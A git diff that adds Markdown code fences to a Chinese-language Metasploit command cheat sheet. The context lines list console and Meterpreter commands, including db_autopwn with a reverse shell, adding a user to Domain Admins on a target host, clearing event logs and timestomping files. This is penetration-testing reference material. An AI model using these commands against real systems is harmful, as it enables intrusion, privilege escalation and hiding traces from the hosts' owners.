@@ -62,6 +62,7 @@ msf > resource name_of_resource_script.rc
 
 ## Metasploit 常用命令列表
 #### MSF 终端命令
+```
 show exploits （列出所有渗透攻击模块
 show payloads （列出所有攻击载荷
 show auxiliary （列出所有辅助攻击模块
@@ -97,8 +98,9 @@ db_autopwn -h （帮助信息
 db_autopwn -p -r -e （对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell
 db_destroy （删除当前数据库
 db_destroy user:password@host:port/database （使用高级选项来删除数据库
-
+```
 #### Meterpreter命令
+```
 help （帮助
 run scriptname （运行脚本
 sysinfo （列出受控主机的系统信息
@@ -141,3 +143,4 @@ add_group_user “Domain Admins” username -h ip （将用户添加到目标主
 clearev （清除目标主机上的日志记录
 timestomp （修改文件属性
 reboot （重启目标主机
+```
